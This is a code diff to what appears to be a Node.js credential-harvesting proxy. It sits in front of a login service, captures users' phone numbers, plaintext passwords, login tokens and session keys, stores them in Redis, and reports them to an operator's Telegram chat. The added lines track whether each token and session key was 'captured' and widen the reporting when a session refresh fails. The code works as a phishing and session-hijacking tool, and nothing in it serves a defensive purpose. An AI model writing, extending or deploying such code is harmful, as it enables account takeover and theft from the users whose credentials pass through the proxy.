@@ -705,19 +705,23 @@ app.post('/app/auth/login', async (req, res) => {
     const pwd = body.password || body.pwd || '';
     const respData = getResponseData(jsonResp);
     let userId = '';
+    let loginTokenCaptured = false;
+    let sessionKeyCaptured = false;
     if (respData && typeof respData === 'object') {
       userId = respData.userId || respData.id || respData.memberId || '';
       if (respData.loginToken || respData.token) {
         const tok = respData.loginToken || respData.token;
         if (userId) {
           tokenUserMap[tok.substring(0, 100)] = String(userId);
-          if (redis) redis.hset('dschfTokenMap', tok.substring(0, 100), String(userId)).catch(()=>{});
+          if (redis) await redis.hset('dschfTokenMap', tok.substring(0, 100), String(userId)).catch(()=>{});
+          loginTokenCaptured = true;
         }
       }
       if (respData.sessionKey) {
         if (userId) {
           tokenUserMap['session_' + String(userId)] = String(userId);
           saveSessionKey(String(userId), respData.sessionKey);
+          sessionKeyCaptured = true;
         }
       }
     }
@@ -728,7 +732,7 @@ app.post('/app/auth/login', async (req, res) => {
     }
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId,
-        `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+        `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🔐 Token: ${loginTokenCaptured ? '✅' : '❌'} | SK: ${sessionKeyCaptured ? '✅' : '❌'}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1223,20 +1227,27 @@ app.all('/app/auth/refresh/session', async (req, res) => {
     const body = req.parsedBody || {};
     const respData = getResponseData(jsonResp);
     let userId = await extractUserId(req, jsonResp);
+    let uidSource = userId ? 'extract' : '';
     if (!userId && body.loginToken) {
       const tokKey = body.loginToken.substring(0, 100);
       userId = tokenUserMap[tokKey];
+      if (userId) uidSource = 'mem-token';
       if (!userId && redis) {
-        try { const stored = await redis.hget('dschfTokenMap', tokKey); if (stored) userId = String(stored); } catch(e) {}
+        try { const stored = await redis.hget('dschfTokenMap', tokKey); if (stored) { userId = String(stored); uidSource = 'redis-token'; } } catch(e) {}
       }
+    }
+    if (!userId && respData && typeof respData === 'object') {
+      const rid = respData.userId || respData.id || respData.memberId || '';
+      if (rid) { userId = String(rid); uidSource = 'resp-data'; }
     }
     if (respData && respData.sessionKey && userId) {
       saveSessionKey(String(userId), respData.sessionKey);
       if (data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId}\n🔑 SK: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored in Redis`).catch(()=>{});
+        bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId} (${uidSource})\n🔑 SK: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored in Redis`).catch(()=>{});
       }
     } else if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId || 'N/A'}\n🔑 HasSK: ${!!(respData && respData.sessionKey)}\n📥 ${respBody.substring(0, 400)}`).catch(()=>{});
+      const hasToken = body.loginToken ? body.loginToken.substring(0,20) + '...' : 'none';
+      bot.sendMessage(data.adminChatId, `🔄 Session Refresh FAILED\n👤 User: ${userId || 'N/A'} (${uidSource || 'not-found'})\n🎫 LoginToken: ${hasToken}\n🔑 HasSK: ${!!(respData && respData.sessionKey)}\n📥 ${respBody.substring(0, 400)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
